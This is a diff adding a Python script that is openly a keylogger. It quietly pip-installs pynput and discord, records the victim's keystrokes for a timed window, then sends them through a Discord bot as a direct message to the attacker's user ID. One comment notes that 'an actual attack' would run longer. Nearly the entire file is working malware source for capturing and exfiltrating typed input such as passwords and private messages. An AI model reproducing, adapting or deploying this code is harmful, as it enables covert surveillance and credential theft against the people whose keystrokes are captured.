@@ -1,0 +1,54 @@
+bot_token = '' # Use your own bot token
+bot_master = '' # Use your own user ID
+
+import subprocess
+try:
+    from pynput import keyboard
+    import threading
+except ModuleNotFoundError:
+    subprocess.run('pip install pynput', shell=True, stdout=subprocess.DEVNULL)
+    from pynput import keyboard
+    import threading
+try:
+    import discord
+except ModuleNotFoundError:
+    subprocess.run('pip install discord', shell=True, stdout=subprocess.DEVNULL)
+    import discord
+
+timer = 5 	# Number of seconds to run the keylogger
+		# for an actual attack, would be longer
+payload = ''	# Stores keystrokes
+
+def on_press(key):
+    global payload
+
+    if key == keyboard.Key.space:
+        payload += ' '
+    elif key == keyboard.Key.enter:
+        payload += '\n'
+    elif key == keyboard.Key.tab:
+        payload += '\t'
+    elif key == keyboard.Key.backspace and len(payload)>0:
+        payload = payload[:-1]
+    else:
+        k = str(key).strip("'")
+        if len(k) == 1:
+            payload += k
+
+with keyboard.Listener(on_press=on_press) as listener:
+    threading.Timer(timer, listener.stop).start()
+    listener.join()
+
+intents = discord.Intents.default()
+client = discord.Client(intents = intents)
+
+@client.event
+async def on_ready():
+    global payload
+    user = await client.fetch_user(bot_master)
+    if len(payload) < 1:
+        payload = 'No user input'
+    await user.send(payload)
+    await client.close()
+
+client.run(bot_token, log_handler=None)
